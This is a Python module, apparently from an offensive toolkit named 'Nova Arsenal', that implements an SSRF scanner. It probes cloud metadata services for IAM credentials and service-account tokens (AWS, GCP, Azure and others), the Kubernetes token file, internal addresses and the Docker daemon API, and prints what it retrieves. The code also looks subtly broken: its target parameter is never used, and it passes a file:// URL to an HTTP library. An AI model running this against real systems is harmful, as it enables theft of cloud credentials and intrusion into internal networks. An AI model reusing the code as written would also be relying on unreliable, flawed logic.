"""
Nova Arsenal — SSRF Scanner Module
Extends verify_ssrf_direct.py with expanded cloud metadata targets,
Kubernetes service account token exfil, and internal network probing.
"""

import requests
import json
from typing import Optional

CLOUD_METADATA_TARGETS = [
    ("AWS IMDSv1",       "http://169.254.169.254/latest/meta-data/"),
    ("AWS IMDSv1 IAM",   "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("AWS IMDSv2 token", "http://169.254.169.254/latest/api/token"),
    ("GCP Metadata",     "http://metadata.google.internal/computeMetadata/v1/",
                         {"Metadata-Flavor": "Google"}),
    ("GCP Service Acct", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                         {"Metadata-Flavor": "Google"}),
    ("Azure IMDS",       "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                         {"Metadata": "true"}),
    ("Azure Token",      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                         {"Metadata": "true"}),
    ("DO Metadata",      "http://169.254.169.254/metadata/v1/"),
    ("K8s Service Token","file:///var/run/secrets/kubernetes.io/serviceaccount/token"),
    ("K8s API",          "https://kubernetes.default.svc/api/v1/namespaces"),
    ("Alibaba Cloud",    "http://100.100.100.200/latest/meta-data/"),
    ("Oracle Cloud",     "http://169.254.169.254/opc/v1/instance/"),
    ("HTTPBin (probe)",  "http://httpbin.org/get"),
    ("Localhost 8080",   "http://127.0.0.1:8080/"),
    ("Localhost 80",     "http://127.0.0.1:80/"),
    ("Localhost 443",    "https://127.0.0.1:443/"),
    ("Localhost 3000",   "http://127.0.0.1:3000/"),
    ("Internal 10.x",   "http://10.0.0.1/"),
    ("Internal 192.x",  "http://192.168.1.1/"),
    ("Docker daemon",    "http://localhost:2375/containers/json"),
]

class SSRFScanner:
    def __init__(self, target: Optional[str] = None, verbose: bool = False):
        self.target = target
        self.verbose = verbose
        self.results = []

    def _probe(self, name: str, url: str, headers: dict = None):
        h = headers or {}
        try:
            r = requests.get(url, headers=h, timeout=5, verify=False, allow_redirects=False)
            if r.status_code in (200, 201, 301, 302):
                finding = {
                    "name": name,
                    "url": url,
                    "status": r.status_code,
                    "size": len(r.content),
                    "snippet": r.text[:200].replace("\n", " "),
                }
                self.results.append(finding)
                print(f"  🔥 LIVE [{r.status_code}] {name}")
                print(f"     URL:  {url}")
                print(f"     Size: {finding['size']} bytes | {finding['snippet'][:100]}...")
                return finding
            elif self.verbose:
                print(f"  ⚪ [{r.status_code}] {name}")
        except requests.exceptions.SSLError:
            if self.verbose:
                print(f"  🔒 [SSL] {name} — SSL error (try --no-verify)")
        except Exception as e:
            if self.verbose:
                print(f"  ❌ {name}: {str(e)[:60]}")
        return None

    def run(self):
        print(f"\n[*] SSRF Scanner — probing {len(CLOUD_METADATA_TARGETS)} cloud/internal endpoints\n")
        for entry in CLOUD_METADATA_TARGETS:
            name, url = entry[0], entry[1]
            headers = entry[2] if len(entry) > 2 else {}
            self._probe(name, url, headers)

        print(f"\n[=] Scan complete. {len(self.results)} live endpoints found.\n")
        if self.results:
            print("[!] FINDINGS — copy for report:")
            for r in self.results:
                print(f"    • {r['name']}: {r['url']} (HTTP {r['status']}, {r['size']}b)")
        return self.results

    def export_json(self, path: str = "ssrf_findings.json"):
        with open(path, "w") as f:
            json.dump(self.results, f, indent=2)
        print(f"[+] Results saved to {path}")
